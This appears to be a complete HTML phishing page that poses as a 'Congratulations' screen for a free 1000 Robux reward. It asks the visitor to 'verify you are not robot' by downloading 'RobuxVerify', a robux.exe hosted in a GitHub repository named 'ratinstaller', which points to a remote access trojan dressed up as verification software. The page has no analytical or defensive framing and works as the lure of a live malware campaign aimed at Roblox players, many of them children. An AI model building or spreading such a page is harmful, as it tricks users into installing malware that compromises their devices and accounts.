<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Success!</title>
  <link rel="stylesheet" href="styles.css">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 100px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
      text-align: center;
      animation: slideIn 0.5s ease forwards;
    }

    @keyframes slideIn {
      from {
        opacity: 0;
        transform: translateY(-50px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .success-icon {
      margin-bottom: 20px;
      animation: fadeIn 1s ease forwards;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }
      to {
        opacity: 1;
      }
    }

    .success-icon img {
      width: 100px;
      height: 100px;
    }

    h1 {
      color: #4CAF50;
      font-size: 24px;
      margin-bottom: 10px;
      animation: fadeInUp 1s ease forwards;
    }

    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    p {
      color: #666;
      margin-bottom: 20px;
      animation: fadeInUp 1s ease forwards;
    }

    .download-button {
      padding: 12px 24px;
      background-color: #4CAF50;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      animation: fadeInUp 1s ease forwards;
    }

    .download-button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="success-icon">
      <img src="success.gif" alt="Success Icon">
    </div>
    <h1>Congratulations!</h1>
    <p>You've successfully redeemed your code and earned 1000 Robux! Just verify you are not robot!</p>
    <a href="https://github.com/pyroalww/ratinstaller/raw/main/robux.exe" class="download-button">Download RobuxVerify</a>
  </div>
</body>
</html>
